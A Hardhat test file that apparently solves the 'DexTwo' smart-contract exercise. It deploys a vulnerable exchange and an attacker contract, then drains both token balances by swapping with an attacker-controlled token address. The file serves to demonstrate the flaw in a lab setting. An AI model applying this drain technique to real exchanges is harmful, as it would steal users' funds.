import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"
import { Dex } from "../typechain"

const CONTRACT_NAME = "DexTwo"
const CONTRACT_NAME_2 = "SwappableToken"
const CONTRACT_NAME_3 = "DexTwoAttacker"

describe(CONTRACT_NAME, () => {
    let owner, attacker: SignerWithAddress
    let Dex, Token, dex, token1, token2, DexAttacker, dexAttacker: Contract
    let tx: TransactionResponse

    it("Should be possible to drain all balances of token1 and token2 from the DexTwo contract", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        Dex = await ethers.getContractFactory(CONTRACT_NAME)
        dex = await Dex.deploy()
        await dex.deployed()

        Token = await ethers.getContractFactory(CONTRACT_NAME_2)
        token1 = await Token.deploy(dex.address, "TokenName1", "TKN1", 110)
        await token1.deployed()

        Token = await ethers.getContractFactory(CONTRACT_NAME_2)
        token2 = await Token.deploy(dex.address, "TokenName2", "TKN2", 110)
        await token2.deployed()

        await token1.transfer(attacker.address, 10)
        await token2.transfer(attacker.address, 10)

        await token1["approve(address,address,uint256)"](owner.address, dex.address, 100)
        await token2["approve(address,address,uint256)"](owner.address, dex.address, 100)

        await token1["approve(address,address,uint256)"](attacker.address, dex.address, 10000)
        await token2["approve(address,address,uint256)"](attacker.address, dex.address, 10000)

        await dex.setTokens(token1.address, token2.address)

        await dex.add_liquidity(token1.address, 100)
        await dex.add_liquidity(token2.address, 100)

        DexAttacker = await ethers.getContractFactory(CONTRACT_NAME_3)
        dexAttacker = await DexAttacker.deploy()
        await dexAttacker.deployed()

        expect(await dex.getSwapAmount(dexAttacker.address, token1.address, 1)).to.eq(100)

        await dex.connect(attacker).swap(dexAttacker.address, token1.address, 1)
        await dex.connect(attacker).swap(dexAttacker.address, token2.address, 1)

        // console.log(await token1.balanceOf(dex.address), await token2.balanceOf(dex.address))

        const token1DexBalanceAfter = await token1.balanceOf(dex.address)
        const token2DexBalanceAfter = await token2.balanceOf(dex.address)

        expect((Number(token1DexBalanceAfter) == 0) && (Number(token2DexBalanceAfter) == 0)).to.be.true
    })
})